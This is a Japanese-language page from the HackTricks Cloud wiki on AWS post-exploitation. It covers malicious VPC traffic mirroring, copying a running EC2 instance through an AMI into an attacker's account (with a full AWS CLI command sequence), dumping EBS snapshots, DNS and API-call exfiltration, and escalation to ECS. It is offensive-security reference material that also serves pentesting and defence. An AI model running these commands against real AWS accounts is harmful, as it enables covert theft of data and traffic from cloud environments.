# AWS - EC2、EBS、SSM＆VPCのポストエクスプロイテーション

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* もしもあなたの**会社をHackTricksで広告表示したい**場合や、**PEASSの最新バージョンを入手したい**場合、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をご覧ください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。これは私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私をフォローしてください 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## EC2＆VPC

詳細については、以下を参照してください：

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### **悪意のあるVPCミラー**

VPCトラフィックミラーリングは、VPC内のEC2インスタンスの入出力トラフィックを**インスタンス自体に何もインストールする必要なく複製**します。この複製されたトラフィックは、通常、ネットワーク侵入検知システム（IDS）などに送信され、分析と監視のために使用されます。\
攻撃者はこれを悪用して、すべてのトラフィックをキャプチャし、そこから機密情報を取得することができます：

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md" %}
[aws-malicious-vpc-mirror.md](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md)
{% endcontent-ref %}

### 実行中のインスタンスのコピー

インスタンスには通常、いくつかの機密情報が含まれています。内部に入るためのさまざまな方法があります（[EC2特権エスカレーショントリック](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md)を参照）。ただし、その内容を確認する別の方法は、**AMIを作成し、それから新しいインスタンスを実行する（自分自身のアカウント内でも）**ことです：
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBSスナップショットのダンプ

**スナップショットはボリュームのバックアップ**であり、通常は**機密情報を含んでいます**。したがって、これらをチェックすることでこの情報を明らかにすることができます。\
スナップショットのない**ボリュームを見つけた場合**、以下のアクションを実行するために**スナップショットを作成**するか、単にアカウント内のインスタンスに**マウント**することができます。

{% content-ref url="aws-ebs-spanshot-dump.md" %}
[aws-ebs-spanshot-dump.md](aws-ebs-spanshot-dump.md)
{% endcontent-ref %}

### データの外部流出

#### DNSを介したデータの外部流出

EC2をロックダウンしてトラフィックが外部に出ないようにしても、DNS経由で**データを外部に流出**させることができます。

* **VPCフローログはこれを記録しません**。
* AWSのDNSログにはアクセスできません。
* 以下のコマンドを使用して「enableDnsSupport」をfalseに設定してこれを無効にします：

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### API呼び出しを介したデータの外部流出

攻撃者は、自分が制御するアカウントのAPIエンドポイントを呼び出すことができます。Cloudtrailはこの呼び出しをログに記録し、攻撃者はCloudtrailログでデータの外部流出を確認することができます。

### SSMのポストエクスプロイテーション

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-ssm-post-exploitation.md" %}
[aws-ssm-post-exploitation.md](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-ssm-post-exploitation.md)
{% endcontent-ref %}

### ECSへの特権昇格

EC2インスタンスを実行し、それを使用してECSインスタンスを実行するために登録することが可能であり、その後ECSインスタンスのデータを盗むことができます。

[**詳細についてはこちらを参照してください**](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs).

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**最新バージョンのPEASSを入手したい**場合、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をご確認ください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私をフォローしてください🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリに**PRを提出**することで、あなたのハッキングトリックを共有してください。

</details>
